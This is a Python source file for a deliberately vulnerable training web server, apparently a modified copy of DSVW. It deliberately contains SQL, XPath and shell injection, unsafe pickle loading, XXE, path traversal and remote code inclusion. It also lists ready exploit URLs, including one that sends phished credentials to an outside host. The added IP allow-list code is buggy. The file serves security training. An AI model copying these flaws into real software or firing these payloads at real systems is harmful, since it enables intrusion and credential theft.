#!/usr/bin/env python
import html, http.client, http.server, io, json, os, pickle, random, re, socket, socketserver, sqlite3, string, sys, subprocess, time, traceback, urllib.parse, urllib.request, xml.etree.ElementTree  # Python 3 required
try:
    import lxml.etree
except ImportError:
    print("[!] please install 'python-lxml' to (also) get access to XML vulnerabilities (e.g. '%s')\n" % ("apt-get install python-lxml" if os.name != "nt" else "https://pypi.python.org/pypi/lxml"))

NAME, VERSION, GITHUB, AUTHOR, LICENSE = "Damn Small Vulnerable Web (DSVW) < 100 LoC (Lines of Code)", "0.2b", "https://github.com/stamparm/DSVW", "Miroslav Stampar (@stamparm)", "Unlicense (public domain)"
LISTEN_ADDRESS, LISTEN_PORT = "127.0.0.1", 65412
HTML_PREFIX, HTML_POSTFIX = "<!DOCTYPE html>\n<html>\n<head>\n<style>a {font-weight: bold; text-decoration: none; visited: blue; color: blue;} ul {display: inline-block;} .disabled {text-decoration: line-through; color: gray} .disabled a {visited: gray; color: gray; pointer-events: none; cursor: default} table {border-collapse: collapse; margin: 12px; border: 2px solid black} th, td {border: 1px solid black; padding: 3px} span {font-size: larger; font-weight: bold}</style>\n<title>%s</title>\n</head>\n<body style='font: 12px monospace'>\n<script>function process(data) {alert(\"Surname(s) from JSON results: \" + Object.keys(data).map(function(k) {return data[k]}));}; var index=document.location.hash.indexOf('lang='); if (index != -1) document.write('<div style=\"position: absolute; top: 5px; right: 5px;\">Chosen language: <b>' + decodeURIComponent(document.location.hash.substring(index + 5)) + '</b></div>');</script>\n" % html.escape(NAME), "<div style=\"position: fixed; bottom: 5px; text-align: center; width: 100%%;\">Powered by <a href=\"%s\" style=\"font-weight: bold; text-decoration: none; visited: blue; color: blue\" target=\"_blank\">%s</a> (v<b>%s</b>)</div>\n</body>\n</html>" % (GITHUB, re.search(r"\(([^)]+)", NAME).group(1), VERSION)
USERS_XML = """<?xml version="1.0" encoding="utf-8"?><users><user id="0"><username>admin</username><name>admin</name><surname>admin</surname><password>7en8aiDoh!</password></user><user id="1"><username>dricci</username><name>dian</name><surname>ricci</surname><password>12345</password></user><user id="2"><username>amason</username><name>anthony</name><surname>mason</surname><password>gandalf</password></user><user id="3"><username>svargas</username><name>sandra</name><surname>vargas</surname><password>phest1945</password></user></users>"""
CASES = (("Blind SQL Injection (<i>boolean</i>)", "?id=2", "/?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%277%27\" onclick=\"alert('checking if the first character for admin\\'s password is digit \\'7\\' (true in case of same result(s) as for \\'vulnerable\\')')", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#boolean-exploitation-technique"), ("Blind SQL Injection (<i>time</i>)", "?id=2", "/?id=(SELECT%20(CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C2%2C1)%3D%27e%27)%20THEN%20(LIKE(%27ABCDEFG%27%2CUPPER(HEX(RANDOMBLOB(300000000)))))%20ELSE%200%20END))\" onclick=\"alert('checking if the second character for admin\\'s password is letter \\'e\\' (true in case of delayed response)')", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#time-delay-exploitation-technique"), ("UNION SQL Injection", "?id=2", "/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D%27admin%27)", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#union-exploitation-technique"), ("Login Bypass", "/login?username=&amp;password=", "/login?username=admin&amp;password=%27%20OR%20%271%27%20LIKE%20%271", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#classic-sql-injection"), ("HTTP Parameter Pollution", "/login?username=&amp;password=", "/login?username=admin&amp;password=%27%2F*&amp;password=*%2FOR%2F*&amp;password=*%2F%271%27%2F*&amp;password=*%2FLIKE%2F*&amp;password=*%2F%271", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution"), ("Cross Site Scripting (<i>reflected</i>)", "/?v=0.2", "/?v=0.2%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting"), ("Cross Site Scripting (<i>stored</i>)", "/?comment=\" onclick=\"document.location='/?comment='+prompt('please leave a comment'); return false", "/?comment=%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting"), ("Cross Site Scripting (<i>DOM</i>)", "/?#lang=en", "/?foobar#lang=en%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting"), ("Cross Site Scripting (<i>JSONP</i>)", "/users.json?callback=process\" onclick=\"var script=document.createElement('script');script.src='/users.json?callback=process';document.getElementsByTagName('head')[0].appendChild(script);return false", "/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess\" onclick=\"var script=document.createElement('script');script.src='/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess';document.getElementsByTagName('head')[0].appendChild(script);return false", "http://www.metaltoad.com/blog/using-jsonp-safely"), ("XML External Entity (<i>local</i>)", "/?xml=%3Croot%3E%3C%2Froot%3E", "/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E" if os.name != "nt" else "/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2FC%3A%2FWindows%2Fwin.ini%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection"), ("XML External Entity (<i>remote</i>)", "/?xml=%3Croot%3E%3C%2Froot%3E", "/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fpastebin.com%2Fraw.php%3Fi%3Dh1rvVnvx%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection"), ("Server Side Request Forgery", "/?path=", "/?path=http%3A%2F%2F127.0.0.1%3A631" if os.name != "nt" else "/?path=%5C%5C127.0.0.1%5CC%24%5CWindows%5Cwin.ini", "http://www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/"), ("Blind XPath Injection (<i>boolean</i>)", "/?name=dian", "/?name=admin%27%20and%20substring(password%2Ftext()%2C3%2C1)%3D%27n\" onclick=\"alert('checking if the third character for admin\\'s password is letter \\'n\\' (true in case of found item)')", "https://owasp.org/www-community/attacks/XPATH_Injection"), ("Cross Site Request Forgery", "/?comment=", "/?v=%3Cimg%20src%3D%22%2F%3Fcomment%3D%253Cdiv%2520style%253D%2522color%253Ared%253B%2520font-weight%253A%2520bold%2522%253EI%2520quit%2520the%2520job%253C%252Fdiv%253E%22%3E\" onclick=\"alert('please visit \\'vulnerable\\' page to see what this click has caused')", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery"), ("Frame Injection (<i>phishing</i>)", "/?v=0.2", "/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flogin.html%22%20style%3D%22background-color%3Awhite%3Bz-index%3A10%3Btop%3A10%25%3Bleft%3A10%25%3Bposition%3Afixed%3Bborder-collapse%3Acollapse%3Bborder%3A1px%20solid%20%23a8a8a8%22%3E%3C%2Fiframe%3E", "http://www.gnucitizen.org/blog/frame-injection-fun/"), ("Frame Injection (<i>content spoofing</i>)", "/?v=0.2", "/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fdsvw.c1.biz%2F%22%20style%3D%22background-color%3Awhite%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20frameborder%3D%220%22%3E%3C%2Fiframe%3E", "http://www.gnucitizen.org/blog/frame-injection-fun/"), ("Clickjacking", None, "/?v=0.2%3Cdiv%20style%3D%22opacity%3A0%3Bfilter%3Aalpha(opacity%3D20)%3Bbackground-color%3A%23000%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20onclick%3D%22document.location%3D%27http%3A%2F%2Fdsvw.c1.biz%2F%27%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert(%22click%20anywhere%20on%20page%22)%3B%3C%2Fscript%3E", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking"), ("Unvalidated Redirect", "/?redir=", "/?redir=http%3A%2F%2Fdsvw.c1.biz", "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html"), ("Arbitrary Code Execution", "/?domain=www.google.com", "/?domain=www.google.com%3B%20ifconfig" if os.name != "nt" else "/?domain=www.google.com%26%20ipconfig", "https://en.wikipedia.org/wiki/Arbitrary_code_execution"), ("Full Path Disclosure", "/?path=", "/?path=foobar", "https://owasp.org/www-community/attacks/Full_Path_Disclosure"), ("Source Code Disclosure", "/?path=", "/?path=dsvw.py", "https://www.imperva.com/resources/glossary?term=source_code_disclosure"), ("Path Traversal", "/?path=", "/?path=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd" if os.name != "nt" else "/?path=..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini", "https://www.owasp.org/index.php/Path_Traversal"), ("File Inclusion (<i>remote</i>)", "/?include=", "/?include=http%%3A%%2F%%2Fpastebin.com%%2Fraw.php%%3Fi%%3D6VyyNNhc&amp;cmd=%s" % ("ifconfig" if os.name != "nt" else "ipconfig"), "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion"), ("HTTP Header Injection (<i>phishing</i>)", "/?charset=utf8", "/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E", "https://www.rapid7.com/db/vulnerabilities/http-generic-script-header-injection"), ("Component with Known Vulnerability (<i>pickle</i>)", "/?object=%s" % urllib.parse.quote(pickle.dumps(dict((_.findtext("username"), (_.findtext("name"), _.findtext("surname"))) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall("user")))), "/?object=cos%%0Asystem%%0A(S%%27%s%%27%%0AtR.%%0A\" onclick=\"alert('checking if arbitrary code can be executed remotely (true in case of delayed response)')" % urllib.parse.quote("ping -c 5 127.0.0.1" if os.name != "nt" else "ping -n 5 127.0.0.1"), "https://www.cs.uic.edu/~s/musings/pickle.html"), ("Denial of Service (<i>memory</i>)", "/?size=32", "/?size=9999999", "https://owasp.org/www-community/attacks/Denial_of_Service"))

ALLOWED_IPS = os.getenv('ALLOWED_IPS')

def init():
    global connection
    http.server.HTTPServer.allow_reuse_address = True
    connection = sqlite3.connect(":memory:", isolation_level=None, check_same_thread=False)
    cursor = connection.cursor()
    cursor.execute("CREATE TABLE users(id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, name TEXT, surname TEXT, password TEXT)")
    cursor.executemany("INSERT INTO users(id, username, name, surname, password) VALUES(NULL, ?, ?, ?, ?)", ((_.findtext("username"), _.findtext("name"), _.findtext("surname"), _.findtext("password")) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall("user")))
    cursor.execute("CREATE TABLE comments(id INTEGER PRIMARY KEY AUTOINCREMENT, comment TEXT, time TEXT)")

class ReqHandler(http.server.BaseHTTPRequestHandler):
    def getIP(self, params):
        content = "<h1>IP Detected: " + self.client_address[0] + "</h1>"
        self.send_response(200)
        self.send_header("Connection", "close")
        self.send_header("X-XSS-Protection", "0")
        self.send_header("Content-Type", "%s%s" % ("text/html" if content.startswith("<!DOCTYPE html>") else "text/plain", "; charset=%s" % params.get("charset", "utf8")))
        self.end_headers()
        self.wfile.write(("%s%s" % (content, HTML_POSTFIX if HTML_PREFIX in content and GITHUB not in content else "")).encode())
        self.wfile.flush()
        return
    
    def no_access(self):
        content = "<h1>Unathorized IP: " + self.client_address[0] + "</h1>"
        self.send_response(200)
        self.send_header("Connection", "close")
        self.send_header("X-XSS-Protection", "0")
        self.send_header("Content-Type", "%s%s" % ("text/html" if content.startswith("<!DOCTYPE html>") else "text/plain", "; charset=%s" % params.get("charset", "utf8")))
        self.end_headers()
        self.wfile.write(("%s%s" % (content, HTML_POSTFIX if HTML_PREFIX in content and GITHUB not in content else "")).encode())
        self.wfile.flush()
        return        
        
    def do_GET(self):
        path, query = self.path.split('?', 1) if '?' in self.path else (self.path, "")
        code, content, params, cursor = http.client.OK, HTML_PREFIX, dict((match.group("parameter"), urllib.parse.unquote(','.join(re.findall(r"(?:\A|[?&])%s=([^&]+)" % match.group("parameter"), query)))) for match in re.finditer(r"((\A|[?&])(?P<parameter>[\w\[\]]+)=)([^&]+)", query)), connection.cursor()
        
        if self.client_address[0] not in ALLOWED_IPS:
            self.no_access(params)
            return
        
        try:
            if path == '/':
                if "id" in params:
                    cursor.execute("SELECT id, username, name, surname FROM users WHERE id=" + params["id"])
                    content += "<div><span>Result(s):</span></div><table><thead><th>id</th><th>username</th><th>name</th><th>surname</th></thead>%s</table>%s" % ("".join("<tr>%s</tr>" % "".join("<td>%s</td>" % ("-" if _ is None else _) for _ in row) for row in cursor.fetchall()), HTML_POSTFIX)
                elif "v" in params:
                    content += re.sub(r"(v<b>)[^<]+(</b>)", r"\g<1>%s\g<2>" % params["v"], HTML_POSTFIX)
                elif "object" in params:
                    content = str(pickle.loads(params["object"].encode()))
                elif "path" in params:
                    content = (open(os.path.abspath(params["path"]), "rb") if not "://" in params["path"] else urllib.request.urlopen(params["path"])).read().decode()
                elif "domain" in params:
                    content = subprocess.check_output("nslookup " + params["domain"], shell=True, stderr=subprocess.STDOUT, stdin=subprocess.PIPE).decode()
                elif "cmd" in params:
                    content = os.system(params["cmd"])
                elif "xml" in params:
                    content = lxml.etree.tostring(lxml.etree.parse(io.BytesIO(params["xml"].encode()), lxml.etree.XMLParser(no_network=False)), pretty_print=True).decode()
                elif "name" in params:
                    found = lxml.etree.parse(io.BytesIO(USERS_XML.encode())).xpath(".//user[name/text()='%s']" % params["name"])
                    content += "<b>Surname:</b> %s%s" % (found[-1].find("surname").text if found else "-", HTML_POSTFIX)
                elif "size" in params:
                    start, _ = time.time(), "<br>".join("#" * int(params["size"]) for _ in range(int(params["size"])))
                    content += "<b>Time required</b> (to 'resize image' to %dx%d): %.6f seconds%s" % (int(params["size"]), int(params["size"]), time.time() - start, HTML_POSTFIX)
                elif "comment" in params or query == "comment=":
                    if "comment" in params:
                        cursor.execute("INSERT INTO comments VALUES(NULL, '%s', '%s')" % (params["comment"], time.ctime()))
                        content += "Thank you for leaving the comment. Please click here <a href=\"/?comment=\">here</a> to see all comments%s" % HTML_POSTFIX
                    else:
                        cursor.execute("SELECT id, comment, time FROM comments")
                        content += "<div><span>Comment(s):</span></div><table><thead><th>id</th><th>comment</th><th>time</th></thead>%s</table>%s" % ("".join("<tr>%s</tr>" % "".join("<td>%s</td>" % ("-" if _ is None else _) for _ in row) for row in cursor.fetchall()), HTML_POSTFIX)
                elif "include" in params:
                    backup, sys.stdout, program, envs = sys.stdout, io.StringIO(), (open(params["include"], "rb") if not "://" in params["include"] else urllib.request.urlopen(params["include"])).read(), {"DOCUMENT_ROOT": os.getcwd(), "HTTP_USER_AGENT": self.headers.get("User-Agent"), "REMOTE_ADDR": self.client_address[0], "REMOTE_PORT": self.client_address[1], "PATH": path, "QUERY_STRING": query}
                    exec(program, envs)
                    content += sys.stdout.getvalue()
                    sys.stdout = backup
                elif "redir" in params:
                    content = content.replace("<head>", "<head><meta http-equiv=\"refresh\" content=\"0; url=%s\"/>" % params["redir"])
                if HTML_PREFIX in content and HTML_POSTFIX not in content:
                    content += "<div><span>Attacks:</span></div>\n<ul>%s\n</ul>\n" % ("".join("\n<li%s>%s - <a href=\"%s\">vulnerable</a>|<a href=\"%s\">exploit</a>|<a href=\"%s\" target=\"_blank\">info</a></li>" % (" class=\"disabled\" title=\"module 'python-lxml' not installed\"" if ("lxml.etree" not in sys.modules and any(_ in case[0].upper() for _ in ("XML", "XPATH"))) else "", case[0], case[1], case[2], case[3]) for case in CASES)).replace("<a href=\"None\">vulnerable</a>|", "<b>-</b>|")
            elif path == "/users.json":
                content = "%s%s%s" % ("" if not "callback" in params else "%s(" % params["callback"], json.dumps(dict((_.findtext("username"), _.findtext("surname")) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall("user"))), "" if not "callback" in params else ")")
            elif path == "/login":
                cursor.execute("SELECT * FROM users WHERE username='" + re.sub(r"[^\w]", "", params.get("username", "")) + "' AND password='" + params.get("password", "") + "'")
                content += "Welcome <b>%s</b><meta http-equiv=\"Set-Cookie\" content=\"SESSIONID=%s; path=/\"><meta http-equiv=\"refresh\" content=\"1; url=/\"/>" % (re.sub(r"[^\w]", "", params.get("username", "")), "".join(random.sample(string.ascii_letters + string.digits, 20))) if cursor.fetchall() else "The username and/or password is incorrect<meta http-equiv=\"Set-Cookie\" content=\"SESSIONID=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT\">"
            else:
                code = http.client.NOT_FOUND
        except Exception as ex:
            content = ex.output if isinstance(ex, subprocess.CalledProcessError) else traceback.format_exc()
            code = http.client.INTERNAL_SERVER_ERROR
        finally:
            self.send_response(code)
            self.send_header("Connection", "close")
            self.send_header("X-XSS-Protection", "0")
            self.send_header("Content-Type", "%s%s" % ("text/html" if content.startswith("<!DOCTYPE html>") else "text/plain", "; charset=%s" % params.get("charset", "utf8")))
            self.end_headers()
            self.wfile.write(("%s%s" % (content, HTML_POSTFIX if HTML_PREFIX in content and GITHUB not in content else "")).encode())
            self.wfile.flush()

class ThreadingServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    def server_bind(self):
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        http.server.HTTPServer.server_bind(self)

if __name__ == "__main__":
    init()
    print("%s #v%s\n by: %s\n\n[i] running HTTP server at 'http://%s:%d'..." % (NAME, VERSION, AUTHOR, LISTEN_ADDRESS, LISTEN_PORT))
    try:
        ThreadingServer((LISTEN_ADDRESS, LISTEN_PORT), ReqHandler).serve_forever()
    except KeyboardInterrupt:
        pass
    except Exception as ex:
        print("[x] exception occurred ('%s')" % ex)
    finally:
        os._exit(0)
